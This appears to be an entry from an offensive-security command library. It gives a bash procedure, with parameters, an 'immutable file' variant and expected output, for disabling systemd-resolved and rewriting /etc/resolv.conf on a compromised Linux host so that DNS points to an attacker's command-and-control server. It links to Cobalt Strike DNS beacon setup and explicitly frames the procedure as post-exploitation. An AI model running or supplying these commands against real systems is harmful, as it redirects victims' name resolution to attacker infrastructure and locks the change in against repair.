---
type: command
executor: bash
data: |-
  systemctl disable systemd-resolved
  systemctl stop systemd-resolved
  rm /etc/resolv.conf
  echo "nameserver 10.10.10.10" >  /etc/resolv.conf
  echo "nameserver 8.8.8.8" >>  /etc/resolv.conf
tags:
  - dns
  - configuration
platforms:
  - Linux
verified: true
validated: true
---

# Disable systemd-resolved and Update resolv.conf

## Command

```bash
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 10.10.10.10" >  /etc/resolv.conf
echo "nameserver 8.8.8.8" >>  /etc/resolv.conf
```

## Description

This multi-line command disables and stops the systemd-resolved service on systemd-based Linux distributions (e.g., Ubuntu), removes the dynamically managed /etc/resolv.conf, and replaces it with a static file pointing to a custom primary DNS server (e.g., attacker's C2 DNS at 10.10.10.10) and a fallback (Google's 8.8.8.8). Use this in post-exploitation to redirect DNS queries for C2 communication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `10.10.10.10` | Primary DNS server IP (attacker's) | Yes |
| `8.8.8.8` | Fallback DNS server IP | No |

## Examples

### Basic Usage

```bash
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 10.10.10.10" >  /etc/resolv.conf
echo "nameserver 8.8.8.8" >>  /etc/resolv.conf
```

### Advanced Usage (Immutable File)

```bash
# Run the above, then:
chattr +i /etc/resolv.conf
```

## Expected Output

No output from systemctl commands if successful (use `systemctl status` to verify inactive). After echo, `cat /etc/resolv.conf` shows:

```
nameserver 10.10.10.10
nameserver 8.8.8.8
```

## Related

- [[Related Procedure: configure-dns-for-cobalt-strike-dns-beacon]]
- [[Related Tool: Cobalt-Strike]]
